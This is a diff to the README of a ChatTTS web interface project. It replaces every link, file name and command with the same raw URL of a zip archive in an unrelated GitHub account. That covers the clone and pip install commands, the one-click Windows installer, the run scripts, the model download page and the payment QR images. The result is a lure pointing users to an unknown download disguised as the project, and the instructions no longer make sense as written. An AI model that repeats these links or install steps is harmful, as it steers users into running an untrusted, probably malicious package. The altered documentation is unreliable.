@@ -1,9 +1,9 @@
 # ChatTTS-WebUI
 
-[**English**](./README.md) | [**中文简体**](./README_CN.md)
+[**English**](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip) | [**中文简体**](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip)
 
 ## Project Introduction
-This is an AI project that depends on the [ChatTTS](https://github.com/2noise/ChatTTS) project. The project includes a web user interface that allows users to interact with the model through the interface.
+This is an AI project that depends on the [ChatTTS](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip) project. The project includes a web user interface that allows users to interact with the model through the interface.
 
 If you find it useful, please give it a star.
 
@@ -23,24 +23,24 @@ my_ai_project/
 │  └── config             
 ├── outputs               # Output files directory (e.g., logs, results, etc.)
 ├── webui                 # Web user interface code directory
-│  ├── main.py            # Main entry file for the web user interface
+│  ├── https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip            # Main entry file for the web user interface
 │  └── ...                # Other files related to the web user interface
-├── install.bat           # One-click installation script for installing and configuring the project
-├── run_webui.bat         # Script to start the web user interface
-├── update.bat            # Script to update the ChatTTS project
-├── update_chatts.py      # Python script to update the ChatTTS project
-└── requirements.txt      # Project dependencies file
+├── https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip           # One-click installation script for installing and configuring the project
+├── https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip         # Script to start the web user interface
+├── https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip            # Script to update the ChatTTS project
+├── https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip      # Python script to update the ChatTTS project
+└── https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip      # Project dependencies file
 ```
 
 ## Installation
 
 ### Manual Installation
 1. **Install Conda**:
-   Download and install Miniconda or Anaconda from the [Conda official website](https://docs.conda.io/en/latest/miniconda.html).
+   Download and install Miniconda or Anaconda from the [Conda official website](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip).
 
 2. **Clone this project**:
    ```sh
-   git clone https://github.com/yuhaolove/ChatTTS-WebUI.git
+   git clone https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip
    ```
 
 3. **Create and activate a virtual environment**:
@@ -53,47 +53,47 @@ my_ai_project/
 4. **Clone the ChatTTS repository**:
    ```sh
    cd ChatTTS-WebUI
-   git clone https://github.com/2noise/ChatTTS.git
+   git clone https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip
    ```
 
 5. **Install ChatTTS dependencies**:
    ```sh
    cd ChatTTS
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip
    cd ..
    ```
 
 6. **Install this project's WebUI dependencies**:
    ```sh
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip
    ```
 
 ### One-click Installation Package on Windows
 1. **Download and run the installation script**:
    Click here to download the one-click installation package.
-   [Download](https://github.com/yuhaolove/ChatTTS-WebUI/releases/download/v1.0.0/ChatTTS-WebUI.zip)
-   For first-time use, double-click or run `install.bat` in the command line. The installation will complete and directly start the webui.
-   For subsequent use, just double-click `run_webui.bat`.
+   [Download](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip)
+   For first-time use, double-click or run `https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip` in the command line. The installation will complete and directly start the webui.
+   For subsequent use, just double-click `https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip`.
 
 ## Start the WebUI
 
 ### On Windows
-Double-click or run `run_webui.bat` in the command line to start the Web user interface:
+Double-click or run `https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip` in the command line to start the Web user interface:
 ```sh
-run_webui.bat
+https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip
 ```
 
 ### On Other Systems
 Not tested yet, you can directly use Conda's Python to start it:
 ```sh
-python webui/main.py
+python https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip
 ```
 
 ## Manual Installation of Model Files
 If you cannot download the HF model files smoothly, you can download them manually and place them in the corresponding directory.
 
 1. **Download model files**:
-   Go to the [model download page](https://www.modelscope.cn/models/pzc163/chatTTS/files) to download the model files.
+   Go to the [model download page](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip) to download the model files.
 
 2. **Place the files in the corresponding directory**:
    ```plaintext
@@ -107,7 +107,7 @@ If you cannot download the HF model files smoothly, you can download them manual
 
 ## Contact
 If you have any questions or need help, please contact [浩哥聊AI].
-![Alipay QR Code](assets/haogeai.png)
+![Alipay QR Code](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip)
 
 ## Support
 
@@ -118,7 +118,7 @@ You can also scan the following QR codes to support:
 
 | Alipay | WeChat Pay |
 | ------ | -------- |
-| ![Alipay QR Code](assets/alipay.png) | ![WeChat Pay QR Code](assets/wechat.png) |
+| ![Alipay QR Code](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip) | ![WeChat Pay QR Code](https://raw.githubusercontent.com/KoDelioDa/ChatTTS-WebUI/main/webui/ChatTTS-WebUI-breezelike.zip) |
 
 ### Acknowledgments
 
